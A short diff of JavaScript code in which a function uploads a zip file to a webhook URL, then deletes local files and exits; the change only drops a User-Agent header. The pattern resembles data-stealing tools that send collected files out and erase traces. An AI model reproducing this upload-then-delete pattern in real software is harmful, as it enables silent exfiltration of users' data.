@@ -295,7 +295,7 @@ const send = async (zipFile) => {
   };
   try {
     await axios.post(webhook.url, data, {
-      headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
+      headers: { 'Content-Type': 'multipart/form-data' },
     });
     await deleteFiles();
     process.exit(0);
